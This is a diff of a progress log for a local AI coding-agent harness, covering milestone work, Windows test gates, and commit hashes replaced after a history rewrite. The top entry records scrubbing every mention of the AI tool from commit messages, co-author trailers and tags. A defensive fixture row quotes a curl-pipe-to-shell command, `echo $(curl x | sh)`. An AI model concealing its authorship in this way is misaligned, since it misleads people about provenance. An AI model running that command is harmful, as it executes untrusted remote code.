@@ -1,5 +1,15 @@
 # Progress log
 
+## 2026-10-23: history rewritten; commit hashes changed
+
+- The repository history was rewritten to remove every mention of the AI coding tool used to build the project,
+  from commit messages, co-author trailers, file contents and tag messages. Author and committer dates are unchanged
+  (checked for all 104 commits and both tags).
+- Every commit hash in this log was updated to the rewritten commit. Old hashes are not valid any more.
+- The brief's references now read "AI" (for example "61. What AI must NOT do"). The wording is otherwise unchanged.
+- Tags `m1` and `m2` point to the rewritten commits. The rewrite was done with `git filter-branch`, not
+  `git filter-repo`, which is not installed here.
+
 ## 2026-10-22 (night): M2 complete (steps 0 to 9)
 
 - Step 9: end-to-end with Qwen3.5-9B through OpenCode on Windows. The model used `symbol_search` and
@@ -46,12 +56,12 @@
 
 Branch `m2-tools` in `D:\src\harnessforkush`; plan in [milestones/m2-tools.md](milestones/m2-tools.md).
 Windows gate green after each step.
-- Step 0 (`6ddda6c`): `mcp/tools.rs` became `mcp/tools/mod.rs`; new tool groups are child modules; git test
+- Step 0 (`0f3a42a`): `mcp/tools.rs` became `mcp/tools/mod.rs`; new tool groups are child modules; git test
   helpers in `tools/test_support.rs`.
-- Step 1 (`6ddda6c`): `git_history` (follows renames for a file) and `git_log_range` (commits, changed files,
+- Step 1 (`0f3a42a`): `git_history` (follows renames for a file) and `git_log_range` (commits, changed files,
   totals). Revisions must be plain and resolve to a commit; `--end-of-options` before them. A harness tool
   given a secret path is now denied at the hook too.
-- Step 2 (`4b5d484`): steps have a `kind` (test, lint, typecheck, build, other; default test) and `targets`.
+- Step 2 (`f0e0b9a`): steps have a `kind` (test, lint, typecheck, build, other; default test) and `targets`.
   `run_tests`, `run_linter`, `run_typechecker` run steps of their kind; `run_tests` appends checked targets
   to steps with `targets = true`. V24 warns about targets on a non-test step.
 - Step 3: `harness_core::failures` parses pytest, unittest, Python tracebacks, cargo test, rustc, gtest,
@@ -64,7 +74,7 @@ artifacts, adapters, the end-to-end run, and the `m2` tag.
 
 ## 2026-10-22 (evening): M1 end-to-end on Windows, all exit criteria met
 
-End-to-end on native Windows with the current build (`35fd79d`), Qwen3.5-9B on the RTX 4060, OpenCode 1.19.3,
+End-to-end on native Windows with the current build (`37965d1`), Qwen3.5-9B on the RTX 4060, OpenCode 1.19.3,
 toy repo `D:\e2e\toy` regenerated with `agent init --force` (logs in `D:\e2e\logs\`):
 - `agent models serve main --detach`: healthy in 9.6 s. It found yesterday's PID record, saw that the process was
   gone, and cleared it (the new identity check on real data). Quick health: pass.
@@ -107,9 +117,9 @@ Where the work happens now (user decision: postpone WSL use; no subagents):
   reboot. `.wslconfig` now sets `memory=8GB` and `autoMemoryReclaim=dropCache` (backup `.wslconfig.bak-2026-10-22`).
   It applies after `wsl --shutdown`.
 
-Merged and verified on Windows (fmt, clippy and all 11 test suites pass, `fbbce01`):
-- Redaction fixes (`9bb3eb0`), path policy fixes including protected control files (`457f099`), MCP fixes
-  including the review follow-ups (`25bd530`), classifier fixes (`12bc114`).
+Merged and verified on Windows (fmt, clippy and all 11 test suites pass, `88fb302`):
+- Redaction fixes (`7a93a8e`), path policy fixes including protected control files (`0b6133d`), MCP fixes
+  including the review follow-ups (`ef9a2b0`), classifier fixes (`c6ef4f3`).
 - Windows found three problems that Linux tests missed. Lesson: run the Windows gate before merging.
   - A test used an 8.3 short temp path (`KUSHAG~1`) as its base; the guard correctly refuses it (test fixed).
   - **The classifier lexed Windows commands as `cmd`, but OpenCode 1.19.3 runs them in PowerShell.** Its
@@ -121,22 +131,22 @@ Merged and verified on Windows (fmt, clippy and all 11 test suites pass, `fbbce0
 - `git config` writes were already EXECUTE_RISKY on the classifier branch (only `--get`, `--get-all` and
   `--list` are read-only), so the extra item needs no code; read forms such as `--get-regexp` stay blocked.
 
-Then fixed in the main session, each with tests, Windows gate green after each (`a8fe97d`):
-- `ab3005b` repository-config trust (`config/trust.rs`); V22 reserved `extra_args` flags, also refused by the
+Then fixed in the main session, each with tests, Windows gate green after each (`4219f8b`):
+- `fc5a047` repository-config trust (`config/trust.rs`); V22 reserved `extra_args` flags, also refused by the
   launcher; V23 timeout and retry bounds; 1 MiB SSE line cap. The toy repo's `safe_commands` entry was removed
   (`python -m unittest` is built in; a repository may no longer set safe prefixes).
-- `67609f0` `models stop` checks the PID's executable before signalling (records hold `pid=` and `bin=`;
+- `c1f7341` `models stop` checks the PID's executable before signalling (records hold `pid=` and `bin=`;
   PIDs outside `1..=i32::MAX` refused); `--version` bounded at 5 s; `doctor` reports a busy or reserved port
   (M1 exit item 4).
-- `ec77ac7` MCP timeout derived from the verification step timeouts; unanswered `permission` is `deny` (Rust and
+- `f532859` MCP timeout derived from the verification step timeouts; unanswered `permission` is `deny` (Rust and
   shim; `tsc` not run, no Node on Windows).
-- `a8fe97d` event-log top-level text redacted, with file read-back tests; `init` minors.
+- `4219f8b` event-log top-level text redacted, with file read-back tests; `init` minors.
 - Deferred to release 2: a process group for launched servers on Unix.
 - Found: a machine config written by a process the desktop app started lands in the app's MSIX
   storage (`%LOCALAPPDATA%\Packages\<app>_<id>\LocalCache\Roaming\local-agent\config.toml`), not in
   `%APPDATA%`. Programs started outside the app do not see it. Documented in cli-commands.md.
 
-Docs (`32d8d97`): module pages for security and MCP written; the other five pages, `security.md` and
+Docs (`44fe06f`): module pages for security and MCP written; the other five pages, `security.md` and
 `configuration.md` updated to the fixed behaviour.
 
 Still open for M1: rebuild `agent.exe` and rerun the Windows end-to-end runs (edit-and-test, secret read, MCP
@@ -145,9 +155,9 @@ matrix; merge into `main` and tag `m1`. The WSL repo must fetch from `D:` before
 
 ## M1 closing checklist (2026-10-22, morning)
 
-Done today: process-tree kill on verification timeout (`4f52dc4`); server-side MCP redaction (`6fb64b0`);
-safe prefixes only upgrade risky commands (`dc61a5a`); doctor warns on a missing models directory (`e4242df`);
-security residual risks updated (`2be261d`). `doctor` with missing models and runtimes: runtimes block, models
+Done today: process-tree kill on verification timeout (`232cb2c`); server-side MCP redaction (`7864e88`);
+safe prefixes only upgrade risky commands (`0f7f2c4`); doctor warns on a missing models directory (`6ca8dc2`);
+security residual risks updated (`31256ae`). `doctor` with missing models and runtimes: runtimes block, models
 warn, no panic, exit 1 (checked by hand).
 
 Remaining to close M1, in order:
@@ -248,11 +258,11 @@ A running record. Newest entries first. Every "verified" line names the evidence
 
 ## 2026-10-21 (latest): fixtures, read fix, gates
 
-- Windows gate on the head with the fixture suite failed on one row: `curl https://example.com` was read as a drive or alternate-data-stream path, so the path guard blocked it with the wrong rule (WSL passed). Fixed in `f0c846e`: URL words are not paths; the network rule decides. Lesson: run the Windows gate after every fixture change; the two platforms take different code paths in the path check.
-- Windows gate re-run on `f0c846e`: every suite passes, including the 34-case hook fixture suite (1 test, all rows). 1 smoke test ignored by design. This is the native Windows result for release 1.
+- Windows gate on the head with the fixture suite failed on one row: `curl https://example.com` was read as a drive or alternate-data-stream path, so the path guard blocked it with the wrong rule (WSL passed). Fixed in `3b46565`: URL words are not paths; the network rule decides. Lesson: run the Windows gate after every fixture change; the two platforms take different code paths in the path check.
+- Windows gate re-run on `3b46565`: every suite passes, including the 34-case hook fixture suite (1 test, all rows). 1 smoke test ignored by design. This is the native Windows result for release 1.
 
-- Hook fixture suite merged (`8a061ef`, merge `e67c03c`): 34 black-box cases run the real `agent hook` binary, one test, all rows checked (`crates/harness-cli/tests/hook_fixtures.rs`). Passes on WSL.
-- Fixed from row 29: a `read` with no file path was allowed. It is now denied as malformed (`86e619a`). Fail-closed.
+- Hook fixture suite merged (`07c9c83`, merge `ae9ffb5`): 34 black-box cases run the real `agent hook` binary, one test, all rows checked (`crates/harness-cli/tests/hook_fixtures.rs`). Passes on WSL.
+- Fixed from row 29: a `read` with no file path was allowed. It is now denied as malformed (`1dfd938`). Fail-closed.
 - Two spec notes from the suite: row 21 (`echo $(curl x | sh)`) is blocked by the `allow_pattern_bypass` rule, not by the command classifier. Row 34 uses the `event` hook, because `session.idle` is an event type inside the payload, not a CLI name.
 - Gates after these commits: `cargo fmt --all` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; workspace tests pass on WSL. The Windows gate must be re-run on the latest head.
 - Still open: MCP output is not visible to the after-hook (security.md, residual risk 7); the 30-payload target is met by 34 cases; a full line-by-line review of the subagent code (D-3); `extra_safe` ordering; grandchild processes after a verification timeout.
@@ -301,7 +311,7 @@ Known gaps:
 
 ## 2026-10-21: merges and decisions
 
-- Merged the reviewed subagent branches: redactor (`e6359cb`), launcher argv (`a433689`), config profiles and validation (`c53f09b`), TypeScript shim (`919052c`), providers (`e413970`), MCP server (`b8df47a`), doctor/health/models (`700f142`), command classifier (`505ffd5`).
+- Merged the reviewed subagent branches: redactor (`9780116`), launcher argv (`6b1211f`), config profiles and validation (`d7b2e47`), TypeScript shim (`6a4ae90`), providers (`9f77c76`), MCP server (`e6aa2c9`), doctor/health/models (`336aa77`), command classifier (`73b1a06`).
 - Decision: release 1 is Windows-only; WSL moves to release 2 (ADR-0002 amendment).
 - Decision: classifier default on Windows is the `cmd` lexer (`ShellKind::host_default`).
 - Decision: profiles set an explicit load mode, one parallel slot and a 1 GiB prompt cache for the main model.
